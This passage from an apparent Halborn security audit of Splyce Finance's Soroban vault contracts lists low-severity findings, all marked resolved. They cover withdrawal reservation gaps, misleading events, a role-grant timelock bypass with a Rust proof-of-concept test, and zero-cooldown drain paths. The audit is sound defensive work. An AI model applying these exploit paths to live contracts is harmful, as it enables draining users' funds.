5. Bob's shares remain in PENDING custody until the asset manager calls `return_funds`, which may take hours or days depending on off-chain liquidity management.

The DoS is temporary, bounded by the asset manager's `return_funds` response latency, not permanent. `total_withdrawals_pending` IS tracked on-chain (line 1299, line 1668) but is never compared against `total_idle` remaining after a `process_deposits` transfer.

#### Code Location

`SToken.process_deposits()`**:** sole liquidity check: no withdrawal reservation floor

```rust
let total_idle = read_total_idle(&env);
if amount > total_idle {
    return Err(STokenCoreError::InsufficientBalance);
}
// Missing: if total_idle - amount < read_total_withdrawals_pending(&env) { return Err(...); }
```

`SToken.fulfill_withdrawal()`**:** downstream revert when idle is zero

```rust
if amount_to_pay > read_total_idle(&env) {
    return Err(STokenWithdrawalRequestError::InsufficientBalance);
}
```

**Impact.**

All pending withdrawal requests are blocked from fulfillment for the duration of the asset manager's return-funds latency. Users whose shares are in vault custody cannot retrieve their underlying tokens or cancel to recover shares without absorbing fees. An operational error by the processor bot, sending `amount = total_idle` rather than `total_idle - total_withdrawals_pending`, triggers this state on any vault with outstanding withdrawal requests.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a reservation check in `SToken.process_deposits()` immediately after the existing `amount > total_idle` guard, ensuring the funds that remain in the vault after the transfer are sufficient to cover all pending withdrawal obligations.
- Document that the processor should compute `max_deployable = total_idle - total_withdrawals_pending` before calling `process_deposits`, even after the on-chain guard is added, to make the operational invariant explicit in off-chain tooling.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding an `idle_after < total_withdrawals_pending` reservation guard in `process_deposits`, reusing the same value for the idle-balance write, following the recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-028] Post-Mint Re-Addition Inflates VaultTotalSharesUpdated Swap Event

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.50 (AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-28) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | observability |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/6adb6ff0e6f533865e5e450ba0f6a367a9a64bf4 |
| **Redacted** | false |

**Description.**

`SToken.swap_tokens()` reads `destination_vault.total_shares()` after both `allowlist_mint` calls have already updated the on-chain supply, then adds `destination_amount_to_mint` and `dest_fee_tokens` a second time before passing the result to `write_vault_total_shares`. Because `total_shares()` already reflects the post-mint supply, the `checked_add` produces a value exactly `(destination_amount_to_mint + dest_fee_tokens)` higher than the actual on-chain total.

`write_vault_total_shares` writes no state, it only emits a `VaultTotalSharesUpdated` event, so the on-chain supply tracked by `Base::total_supply` is always correct, but every swap emits an event that reports an inflated total shares figure, misleading any off-chain indexer, monitoring system, or analytics platform that consumes this event.

Step-by-step:

1. `allowlist_mint(source_vault, caller, destination_amount_to_mint)`, destination supply increases by `destination_amount_to_mint`.
2. `allowlist_mint(source_vault, dest_accountant, dest_fee_tokens)`, destination supply increases by `dest_fee_tokens`.
3. `dest_total_shares = destination_vault.total_shares()`, reads the already-updated supply (correct).
4. `new_dest_total_shares = dest_total_shares + destination_amount_to_mint + dest_fee_tokens`, double-counts the already-included amounts.
5. `write_vault_total_shares(source_vault, new_dest_total_shares)`, emits event with the inflated value.

#### Code Location

`SToken.swap_tokens()`**:** post-mint read followed by redundant addition

```rust
// contracts/stoken/src/stoken.rs
// Step 1 & 2: Both allowlist_mint calls happen at lines 2306 and 2321
desitnation_vault_client.allowlist_mint(&source_vault, &caller, &destination_amount_to_mint);
// ...
desitnation_vault_client.allowlist_mint(&source_vault, &dest_accountant, &dest_fee_tokens);

// Step 3: total_shares() now already includes destination_amount_to_mint + dest_fee_tokens
let dest_total_shares = desitnation_vault_client.total_shares(); // line 2347: post-mint read

// Step 4: INCORRECT, re-adds already-counted amounts
let new_dest_total_shares = dest_total_shares
    .checked_add(destination_amount_to_mint)        // line 2349: double-count
    .and_then(|v| v.checked_add(dest_fee_tokens))   // line 2350: double-count
    .ok_or(STokenSwapError::MathOverflow)?;

// Step 5: event emitted with inflated value
desitnation_vault_client.write_vault_total_shares(&source_vault, &new_dest_total_shares); // line 2353
```

**Impact.**

- Every `swap_tokens` call emits a `VaultTotalSharesUpdated` event whose `shares` field is `(destination_amount_to_mint + dest_fee_tokens)` higher than the actual on-chain supply; for a swap minting 95 user shares and 5 fee shares, the event reports 100 more shares than exist.
- Off-chain indexers, TVL dashboards, and monitoring systems that rely on `VaultTotalSharesUpdated` instead of reading on-chain state directly will report inflated total supply, inflated TVL, and incorrect share price, potentially misleading users and protocol risk monitors.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Remove the redundant `checked_add` calls and pass `dest_total_shares` (which already reflects the post-mint supply) directly to `write_vault_total_shares`.
- Alternatively, remove the `write_vault_total_shares` call entirely. It writes no state and the `VaultTotalSharesUpdated` event it emits is redundant with the `Transfer`/`Mint` events already emitted by `allowlist_mint`; removing it eliminates the misleading signal with no loss of on-chain correctness.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-029] Premature Burn Event In burn() Mismatches Actual Destruction

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.50 (AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-29) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | observability |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/e56c78cd66420da9785dd22a811b0ab0eb1449e2 |
| **Redacted** | false |

**Description.**

`SToken.burn()` and `SToken.burn_from()` call `emit_burn` immediately after `redeem_core`, before the caller's shares are destroyed. `redeem_core` does not burn shares: it transfers them to vault custody via `Base::update(owner → vault_address)` and creates a pending withdrawal request. The actual `Base::update(vault_address → None)` burn happens later in `SToken.fulfill_withdrawal()` when the processor fulfills the request. The early `emit_burn` in `burn`/`burn_from` fires with `from` as the source address for the full `amount` (including fee shares), while the actual burn event in `fulfill_withdrawal` fires with `vault_address` as the source for only `shares_after_fee` (post-fee). The premature event emission produces two `burn` events per logical burn with mismatched source addresses and mismatched amounts, making reconciliation by off-chain systems impossible.

Step-by-step for a `burn(100 shares)` call with a 5-share withdrawal fee:

1. `redeem_core` is called, 100 shares move from `from` to `vault_address`; `emit_transfer(from → vault_address, 100)` fires.
2. `emit_burn(from, 100)` fires immediately in `burn()`, shares still exist in vault custody.
3. Off-chain indexers decrement `from`'s balance by 100 and total supply by 100.
4. Days later, processor calls `fulfill_withdrawal`. `Base::update(vault_address, None, 95)` destroys 95 shares; `emit_burn(vault_address, 95)` fires.
5. Off-chain indexers decrement total supply by another 95, net double-decrement of 195 against a single logical burn of 95.

#### Code Location

`SToken.burn()`: premature `emit_burn` before token destruction

```rust
// contracts/stoken/src/stoken.rs
fn burn(e: &Env, from: Address, amount: i128) {
    from.require_auth();
    // ...
    // redeem_core moves shares to vault custody (NOT a burn)
    Self::redeem_core(e, &from, &from, &from, shares, 0)
        .unwrap_or_else(|err| panic!("SToken: burn failed: {:?}", err));
    emit_burn(e, &from, amount); // line 3147: premature, shares still in custody
}
```

`redeem_core()`: shares transferred to custody, NOT burned

```rust
// contracts/stoken/src/stoken.rs
// Line 3077-3078: shares moved to vault, not destroyed
Base::update(env, Some(owner), Some(&vault_address), shares as i128);
emit_transfer(env, owner, &vault_address, shares as i128);
```

`SToken.fulfill_withdrawal()`: actual burn event fires later from `vault_address`

```rust
// contracts/stoken/src/stoken.rs
if withdrawal_request.shares > 0 {
    Base::update(&env, Some(&vault_address), None, withdrawal_request.shares as i128);
    emit_burn(&env, &vault_address, withdrawal_request.shares as i128); // line 1346: actual burn
}
```

**Impact.**

- Off-chain indexers, block explorers, and compliance tools that track `burn` events will observe two `burn` events per withdrawal: the first from `from` for `amount` shares, the second from `vault_address` for `shares_after_fee` shares, with different sources and amounts, causing double-counting of supply reduction and incorrect balance attribution.
- Indexers that rely on the event stream (rather than reading on-chain state) will report a total supply lower than actual on-chain supply between the `burn()` call and `fulfill_withdrawal()`, misrepresenting TVL and per-share NAV.
- The discrepancy between `from` / `amount` in the first event and `vault_address` / `shares_after_fee` in the second means the events cannot be reconciled without cross-referencing withdrawal request storage.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Remove `emit_burn` from `SToken.burn()` and `SToken.burn_from()`. No burn event should fire until shares are actually destroyed in `fulfill_withdrawal`, which is the only point where the underlying `Base::update` null-destination call executes.
- The transfer event already emitted by `redeem_core` (owner to vault custody) correctly represents the custody transfer and should be retained.
- The burn event emitted in `fulfill_withdrawal` (from vault custody, for `shares_after_fee`) is semantically correct and should be retained.
- Note that removing the premature burn event means `burn()` emits no burn event at call time. The SEP-41 FungibleBurnable interface expects a burn event to accompany a `burn()` call; however, since this vault's burn is inherently asynchronous (it queues a withdrawal rather than immediately destroying shares), strict SEP-41 event compliance is architecturally incompatible with the withdrawal-queue design. To give integrators a programmatic signal without misusing the burn event semantics, emit a custom event (e.g., `RedemptionQueued`) in `burn`/`burn_from` that communicates the async nature of the operation.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation, removing the premature `emit_burn` calls from `burn()` and `burn_from()` so the only `Burn` event now fires in `fulfill_withdrawal` at actual share destruction, with the custody `Transfer` event retained.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-030] Oracle grant_role Override Absent Bypasses Timelocked Provider Rotation

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.50 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:M/I:H/D:M/Y:N) (source: HAL-30) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs:L80-L84`, `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs:L68-L72`, `contracts/accountant/src/accountant.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/b35602b28889d7502d40334fdbc01b419d1dbdef |
| **Redacted** | false |

**Description.**

`NavOracle` and `FixedYieldOracle` implement `AccessControl` with an empty body, inheriting the library's default `grant_role`, `revoke_role`, and `renounce_role` entry points. Every other privileged contract (`SToken`, `Accountant`, `ProxyAssetManager`) overrides these three functions to `panic!()`, forcing all role changes through the timelocked two-step flow. The two oracles omit that override, leaving live entry points that bypass governance cooldowns.

In `NavOracle`, the manager is set as admin-role of `provider` at initialization (nav_oracle.rs:80-84). The inherited library default passes `ensure_if_admin_or_admin_role` for the manager because manager holds the admin-role of `provider`, granting the role instantly with no cooldown.

**Exploit path (compromised manager key):**

1. `NavOracle` deployed with `cooldown_secs = 86_400` (intended 24-hour provider rotation window).
2. Compromised manager calls `grant_role(manager, attacker, "provider")`. `ensure_if_admin_or_admin_role` passes; role granted in the same ledger.
3. Attacker immediately calls `update_vault_price_from_nav(inflated_nav, expected_supply, attacker)`. The 24-hour timelock was never applied.
4. `revoke_role(manager, original_provider, "provider")` removes the legitimate provider in the same transaction; only the attacker retains the `provider` role.
5. In `FixedYieldOracle`, the manager role is self-administered (fixed_yield_oracle.rs:68-72), so the admin can grant or revoke the manager role itself instantly.

#### Code Location

`NavOracle`: empty `AccessControl` impl, inherits unguarded library defaults

```rust
// contracts/nav_oracle/src/nav_oracle.rs (line 440)
#[default_impl]
#[contractimpl]
impl AccessControl for NavOracle {} // no override: grant_role/revoke_role/renounce_role are live
```

`FixedYieldOracle`: identical pattern

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (line 418)
#[default_impl]
#[contractimpl]
impl AccessControl for FixedYieldOracle {} // no override
```

`Accountant`: correct override (contrast)

```rust
// contracts/accountant/src/accountant.rs (lines 537-544)
#[default_impl]
#[contractimpl]
impl AccessControl for Accountant {
    fn grant_role(_e: &Env, _caller: Address, _account: Address, _role: Symbol) {
        panic!("Use propose_roles/accept_roles instead");
    }
    fn revoke_role(_e: &Env, _caller: Address, _account: Address, _role: Symbol) {
        panic!("Use propose_roles/accept_roles instead");
    }
    fn renounce_role(_e: &Env, _caller: Address, _role: Symbol) {
        panic!("Use propose_roles/accept_roles instead");
    }
}
```

**Impact.**

A compromised manager key can install or remove the `provider` role on either oracle instantly with no monitoring window, defeating the security model enforced on every other role-bearing contract. The `provider` role directly controls the price feed for all deposits, withdrawals, and swaps; a rogue provider can push prices within the `max_deviation_bps` auto-accept window with zero delay. The missing override also breaks the single-member assumption that `accept_nav_provider` relies on: a second provider added via `grant_role` leaves one of the two authorized addresses unrevoked when governance executes the rotation, creating a permanently installed rogue provider.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/nav_oracle/src/test.rs` file, under the test function `poc_grant_role_bypasses_provider_rotation_timelock`.

```rust
#[test]
fn poc_grant_role_bypasses_provider_rotation_timelock() {
    let env = Env::default();
    env.ledger().with_mut(|li| li.timestamp = 10_000);

    let cooldown_24h: u64 = 86_400;
    let ctx = setup_nav_oracle(&env, cooldown_24h, 500_000_000_000, 1_000_000_000_000);
    let attacker = Address::generate(&env);

    // §B: Verify attacker cannot push prices before the grant.
    let result_pre = ctx.client
        .mock_auths(&[MockAuth { address: &attacker, invoke: &MockAuthInvoke {
            contract: &ctx.address, fn_name: "update_vault_price_from_nav",
            args: (500_000_000_000u64, 1_000_000_000_000i128, attacker.clone()).into_val(&env),
            sub_invokes: &[],
        }}])
        .try_update_vault_price_from_nav(&500_000_000_000, &1_000_000_000_000, &attacker);
    assert!(result_pre.is_err(), "attacker must not hold provider role before grant");

    // §C: Compromised manager calls grant_role directly — no cooldown, no governance window.
    ctx.client
        .mock_auths(&[MockAuth { address: &ctx.manager, invoke: &MockAuthInvoke {
            contract: &ctx.address, fn_name: "grant_role",
            args: (ctx.manager.clone(), attacker.clone(), Symbol::new(&env, "provider")).into_val(&env),
            sub_invokes: &[],
        }}])
        .grant_role(&ctx.manager, &attacker, &Symbol::new(&env, "provider"));

    // §D: Attacker pushes price in the SAME ledger — 24-hour timelock was never applied.
    let result_post = ctx.client
        .mock_auths(&[MockAuth { address: &attacker, invoke: &MockAuthInvoke {
            contract: &ctx.address, fn_name: "update_vault_price_from_nav",
            args: (500_000_000_000u64, 1_000_000_000_000i128, attacker.clone()).into_val(&env),
            sub_invokes: &[],
        }}])
        .try_update_vault_price_from_nav(&500_000_000_000, &1_000_000_000_000, &attacker);
    assert!(result_post.is_ok(), "attacker bypasses the 24-hour rotation timelock via grant_role");
}
```

#### Execution

```sh
cargo test -p nav_oracle -- poc_grant_role_bypasses_provider_rotation_timelock --nocapture
```

#### Analysis

The test confirms that the inherited `grant_role` entry point on `NavOracle` is live and bypasses the timelocked `propose_nav_provider`/`accept_nav_provider` governance flow. Step §B proves the attacker initially has no provider role and cannot push prices. Step §C shows the compromised manager granting the role directly in the same ledger with no cooldown applied. Step §D confirms the attacker can immediately push a price, demonstrating the 24-hour rotation timelock was never enforced.

**Recommendation.**

To mitigate this issue, we recommend overriding `grant_role`, `revoke_role`, and `renounce_role` in both `NavOracle` and `FixedYieldOracle` to `panic!()`, mirroring the pattern already in place in `Accountant`, `SToken`, and `ProxyAssetManager`. The panic message should direct callers to the timelocked provider-rotation functions instead.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by overriding `grant_role`/`revoke_role`/`renounce_role` to `panic!()` in both oracles (mirroring `Accountant`/`SToken`/`ProxyAssetManager`) and adding a cooldown-gated `propose_manager`/`accept_manager`/`cancel_manager` flow with incoming-manager `require_auth` so manager rotation is not stranded.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-031] Management Fee Mint Bypasses Total Shares Cap

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.50 (AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-31) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | access-control-auth |
| **Location** | `contracts/stoken/src/stoken.rs:L1398-L1400`, `contracts/stoken/src/stoken.rs:L2906-L2907` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/68e96c8bb7c0bb2334a6e2d863e6b93418a4f0eb |
| **Redacted** | false |

**Description.**

`SToken.accrue_management_fee()` mints dilutive fee shares to the accountant with no call to `check_max_total_shares`, unlike every other share-minting path in the contract (`deposit_core`, `allowlist_mint`, and the late-cancel penalty mint), which all enforce the `max_total_shares` cap before minting.

**Exploit path:**

1. `accrue_management_fee` is unpermissioned; any account can call it once enough time has elapsed since `last_mgmt_fee_ts`.
2. The vault's total supply is at or near `max_total_shares` through ordinary deposit activity.
3. Any caller invokes `accrue_management_fee()`; `fee_shares` is computed from elapsed time and the configured `management_fee_bps_per_year`, and minted unconditionally to the accountant.
4. `Vault::total_supply()` now exceeds `max_total_shares`.
5. `check_max_total_shares(read_total_shares, additional, cap)`, which reads live supply and reverts once `current > cap`, now rejects every subsequent `deposit_core` call and every inbound `allowlist_mint` swap.

#### Code Location

`SToken.accrue_management_fee()`**:** unconditional mint, no cap check

```rust
if fee_shares > 0 {
    // Mint fee shares to accountant
    Base::mint(&env, &accountant, fee_shares as i128);
```

`SToken.deposit_core()`**:** the cap check every other mint path enforces (contrast)

```rust
check_max_total_shares(read_total_shares(&env), user_shares, read_max_total_shares(&env))
    .map_err(|_| STokenCoreError::MaxTotalSharesExceeded)?;
```

**Impact.**

- The `max_total_shares` invariant no longer holds once management-fee accrual pushes supply past the configured cap.
- `deposit_core` and inbound `allowlist_mint` swaps revert for every caller until the accountant's fee shares are redeemed or burned down below the cap, blocking the vault's primary entry points with no attacker-controlled trigger required.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Clamp management-fee accrual so `total_supply + fee_shares` never exceeds `max_total_shares`, minting only the shares that fit within the remaining headroom.
- Alternatively, if management-fee dilution is intended to be exempt from the cap by design, document that exemption explicitly and ensure the exemption cannot be exploited to permanently exceed the cap by an unbounded amount.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by clamping the management-fee mint to `headroom = max_total_shares - total_supply` and advancing `last_mgmt_fee_ts` only by the seconds actually paid for via a ceiling-rounded inverse of the fee formula, following the recommended mitigation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-032] Emergency Withdraw Pays Manager Not Depositors

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.50 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:N/D:C/Y:N) (source: HAL-32) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | upgrade-migration |
| **Location** | `contracts/stoken/src/stoken.rs`, `contracts/factory/src/factory.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/29924b337dc1debe65f9471afcaa38f6e474a4b2 |
| **Redacted** | false |

**Description.**

`SToken.emergency_withdraw()` hardcodes its payout destination to `caller`, the manager itself, with no pro-rata depositor distribution path, and `Factory` exposes no deprecation or migration signal for a vault that needs to be wound down.

**Exploit path:**

1. The manager calls `pause_vault()`, then `emergency_withdraw(token_mint, amount, manager)` while `timelock_end == 0`; this first call only records the request and starts the cooldown.
2. After `emergency_withdrawal_cooldown_secs` elapses, the manager repeats the identical call. The balance and match checks pass, and the transfer sends the full requested amount to `caller`, the manager's own address, not to any depositor-facing distribution.
3. `Factory` exposes only `deploy_vault`, `propose_vault_wasm_hash`/`accept_vault_wasm_hash`, and `get_vaults`; there is no function anywhere in the contract that marks a vault as deprecated or signals to integrators that a vault's funds are being wound down.

#### Code Location

`SToken.emergency_withdraw()`**:** transfer destination hardcoded to the calling manager

```rust
// contracts/stoken/src/stoken.rs
let vault_address = env.current_contract_address(); // line 1882
let token = Client::new(&env, &token_mint);
// ...
token.transfer(&vault_address, &caller, &(amount as i128)); // line 1893
```

`Factory`**:** full public interface, no deprecation or migration function

```rust
// contracts/factory/src/factory.rs
pub fn deploy_vault(env: Env, config: VaultInitConfig) -> Result<Address, FactoryError> // line 136
pub fn propose_vault_wasm_hash(...) // line 189
pub fn accept_vault_wasm_hash(env: Env) -> Result<(), FactoryError> // line 238
pub fn get_vaults(env: Env) -> Vec<Address> // line 279
// no deprecate_vault, pause_all, or migration-signal function anywhere in the contract
```

**Impact.**

The only on-chain path that moves the vault's full underlying balance out during a wind-down transfers it entirely to the manager's own address, with no on-chain mechanism to route any portion of it back to depositors pro-rata. Combined with the absence of any deprecation signal at the `Factory` level, users have no on-chain claim, snapshot, or trustless recovery path once a vault's underlying custody is evacuated through this function.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a manager-gated, timelocked sunset mechanism that halts new deposits while leaving withdrawals open, and emit an on-chain snapshot at the moment of the sweep so any off-chain redistribution to depositors can be independently verified.
- For a complete on-chain resolution, implement a claim-based redistribution mechanism keyed to a frozen snapshot so depositors retain a verifiable claim to swept funds.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding by adding a timelocked `propose_sunset`/`accept_sunset`/`cancel_sunset` wind-down mechanism that blocks new deposits and inbound swap mints while keeping withdrawals open (giving depositors a trustless, on-chain self-exit path instead of relying on the manager's sweep), exposing `is_sunset`/`Sunset*` events as the deprecation signal `Factory` lacked, and embedding an ownership/accounting snapshot (`total_shares`, `shares_in_custody`, `total_idle`, `price`) in the `EmergencyWithdraw` event to anchor any off-chain redistribution for genuine emergency sweeps.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-033] Factory Constructor Accepts Zero WASM-Hash Cooldown, Permanently Voiding Timelock

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-33) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/factory/src/factory.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/8b3b3452cc85267b21627ba4cd5f4257b0b5d61d |
| **Redacted** | false |

**Description.**

`Factory.__constructor()` accepts `wasm_hash_change_cooldown_secs: u64` with no minimum value validation and writes it directly to storage. When set to 0, the two-step `propose_vault_wasm_hash` / `accept_vault_wasm_hash` timelock mechanism is completely bypassed: the `accept_vault_wasm_hash` guard `timestamp < pending.timestamp + 0` reduces to `timestamp < pending.timestamp`, which is permanently false because Stellar ledger timestamps are monotonically non-decreasing. Consequently, both calls can succeed in a single Stellar ledger: propose in one transaction, accept in the next transaction of the same ledger close.

There is no setter to change `wasm_hash_change_cooldown_secs` after deployment. A zero misconfiguration is therefore permanent and unmitigatable without redeploying the entire factory and migrating all downstream vault registrations.

**Exploit path:**

1. Factory is deployed with `wasm_hash_change_cooldown_secs = 0` (intentionally or by omission of the argument).
2. Admin key is compromised.
3. Attacker calls `propose_vault_wasm_hash(malicious_wasm_hash)` → writes `PendingWasmHash { wasm_hash: malicious, timestamp: T }`.
4. In the same ledger close (or immediately after, since `T' >= T`), attacker calls `accept_vault_wasm_hash()`.
5. Check: `T' < T + 0` → `T' < T` → false → acceptance succeeds.
6. `write_vault_wasm_hash(&env, &pending.wasm_hash)` commits the malicious WASM hash.
7. All subsequent calls to `deploy_vault` deploy vaults running malicious code with no community observation window.

#### Code Location

`Factory.__constructor()`**:** no minimum bound on cooldown

```rust
// contracts/factory/src/factory.rs, lines 94–132
pub fn __constructor(
    env: Env,
    admin: Address,
    wasm_hash: BytesN<32>,
    wasm_hash_change_cooldown_secs: u64,
) -> Result<(), FactoryError> {
    // ...
    write_wasm_hash_change_cooldown_secs(&env, &wasm_hash_change_cooldown_secs); // zero accepted
    Ok(())
}
```

`Factory.accept_vault_wasm_hash()`**:** guard trivially false when cooldown is zero

```rust
// contracts/factory/src/factory.rs, lines 248–253
let timestamp = env.ledger().timestamp();
let cooldown = read_wasm_hash_change_cooldown_secs(&env);
if timestamp < pending.timestamp + cooldown { // when cooldown==0: always false
    return Err(FactoryError::WasmHashChangeTimelockActive);
}
```

**Impact.**

A zero cooldown permanently voids the only on-chain observation window protecting future vault deployments from malicious WASM. All vaults deployed after a successful malicious hash acceptance execute arbitrary code. Because there is no setter for `wasm_hash_change_cooldown_secs`, a zero misconfiguration cannot be corrected without redeploying the factory and updating all dependent integrations.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a minimum cooldown constant and enforce it in `__constructor`.
- Add a timelocked setter for `wasm_hash_change_cooldown_secs` so an operator can correct an overly short (but non-zero) cooldown without redeploying the factory.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-034] Initialize Accepts Zero Cooldowns Bypassing All Timelocks

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.34 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-34) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | data-validation |
| **Location** | `contracts/factory/src/factory.rs`, `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/306a8043a0c596edb84fef13a1b7f8214bbc99f6 |
| **Redacted** | false |

**Description.**

`SToken::initialize` writes every cooldown value directly from the caller-supplied `VaultInitConfig` with no bounds check against `MIN_COOLDOWN_SECS` (3,600 s) or `MAX_COOLDOWN_SECS`, while `propose_cooldowns` enforces those same bounds post-deployment: an asymmetry that allows zero-value cooldowns to be written at deployment time.

`Factory::deploy_vault` (factory.rs line 169) passes `VaultInitConfig` directly to `stoken.initialize` with no pre-validation. Inside `SToken::initialize` (stoken.rs lines 307–367), each cooldown is written verbatim.

With `emergency_withdrawal_cooldown = 0` the two-call emergency-withdraw flow collapses to a single ledger:

- **Call 1:** `emergency_withdraw(token, amount, manager)`: `timelock_end == 0`, so the guard sets `timelock_end = timestamp + 0 = timestamp` and returns `Ok(())`.
- **Call 2 (same ledger):** `timestamp < timelock_end` evaluates as `timestamp < timestamp` → false, the guard passes, and the transfer executes immediately.

#### Code Location

`SToken::initialize`**:** cooldowns written without bounds validation

```rust
// contracts/stoken/src/stoken.rs: lines 307–367
write_price_update_cooldown_secs(&env, &config.price_update_cooldown_secs.unwrap_or(300));
write_emergency_withdrawal_cooldown(&env, &config.emergency_withdrawal_cooldown.unwrap_or(86400));
write_role_change_cooldown_secs(&env, &config.role_change_cooldown_secs.unwrap_or(172800));
write_config_cooldown_secs(&env, &config.config_cooldown_secs.unwrap_or(86400));
write_fee_change_cooldown_secs(&env, &config.fee_change_cooldown_secs.unwrap_or(86400));
```

`propose_cooldowns`**:** the bounds check that initialize is missing

```rust
// contracts/stoken/src/stoken.rs: line 2391
if cooldown < MIN_COOLDOWN_SECS || cooldown > MAX_COOLDOWN_SECS { // MIN_COOLDOWN_SECS = 3_600
    return Err(STokenCooldownChangeError::InvalidCooldownDuration);
}
```

`Factory::deploy_vault`**:** config passed with no pre-validation

```rust
// contracts/factory/src/factory.rs: line 169
vault_client.initialize(&config);
```

Emergency withdraw collapses to atomic execution when cooldown is zero

```rust
// contracts/stoken/src/stoken.rs: lines 1844–1869
if emergency_withdrawal_timelock_end == 0 {
    write_emergency_withdraw_timelock_end(
        &env,
        &(timestamp + emergency_withdrawal_cooldown_secs), // 0 + 0 = timestamp
    );
    return Ok(());
}
// Second call:
if timestamp < read_emergency_withdraw_timelock_end(&env) { // false when cooldown=0
    return Err(STokenEmergencyWithdrawalError::EmergencyWithdrawalTimelockActive);
}
```

**Impact.**

A factory admin can deploy a vault with all cooldowns set to zero. The most severe consequence is atomic emergency withdrawal: the manager pauses the vault and calls `emergency_withdraw` twice in the same ledger to drain all underlying tokens to the manager address with zero delay, defeating the 24-hour default protection that users rely on. Additionally, zero-cooldown governance flows allow role assignments, fee changes, and limit changes to take effect instantly, removing the observation window that enables users to exit before unfavorable changes activate.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- In `SToken::initialize`, validate every cooldown field (including `emergency_withdrawal_cooldown`) against `MIN_COOLDOWN_SECS` (3,600 s) and `MAX_COOLDOWN_SECS`, mirroring the bounds checks in `propose_cooldowns` (lines 2390–2427), and return `STokenCoreError::InitializationFailed` on any out-of-range value.
- In `Factory::deploy_vault`, add a defense-in-depth validation of all cooldown fields in `VaultInitConfig` against the same bounds before forwarding to `stoken.initialize`.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding `validate_init_cooldown` and applying it to `emergency_withdrawal_cooldown`, `role_change_cooldown_secs`, `config_cooldown_secs`, and `fee_change_cooldown_secs` in `SToken::initialize`, which combined with Soroban's atomic cross-contract call semantics also prevents `Factory::deploy_vault` from ever producing a vault with an invalid cooldown.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-035] Multisig Signer Removal Causes Permanent Account Lockout

| Field | Value |
|---|---|
| **Unified severity** | Low |
